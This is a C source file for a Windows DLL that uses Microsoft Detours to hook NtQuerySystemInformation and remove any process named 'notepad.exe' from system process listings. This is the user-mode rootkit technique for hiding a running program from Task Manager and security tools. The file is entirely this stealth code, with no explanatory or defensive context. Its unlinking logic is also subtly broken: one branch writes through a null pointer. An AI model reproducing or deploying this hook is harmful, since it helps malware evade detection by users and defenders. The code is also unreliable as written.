#include <stdio.h>
#include <Windows.h>
#include <shlwapi.h>
#include "pch.h"
#include "detours.h"
#include <Winternl.h>

#define HIDE_PROCNAME L"notepad.exe"
	
typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

NtQuerySystemInformation_t origNtQuerySystemInformation = NULL;

NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    NTSTATUS status = origNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (SystemInformationClass == SystemProcessInformation) {
        PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pPrevious = NULL;

        while (true) {
            if (pCurrent->ImageName.Buffer != NULL &&
                wcsstr(pCurrent->ImageName.Buffer, HIDE_PROCNAME) != NULL) {
                if (pPrevious == NULL) {
                    pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
                    if (pCurrent->NextEntryOffset != 0) {
                        memmove(pPrevious, pCurrent, (PCHAR)pCurrent - (PCHAR)pPrevious);
                        pCurrent = pPrevious;
                    }
                    else {
                        pPrevious->NextEntryOffset = 0;
                    }
                }
                else {
                    pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
                }
            }
            if (pCurrent->NextEntryOffset == 0) {
                break;
            }
            pPrevious = pCurrent;
            pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
        }
    }
    return status;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        origNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"),"NtQuerySystemInformation");
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
        DetourTransactionCommit();
        break;

    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
        DetourTransactionCommit();
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}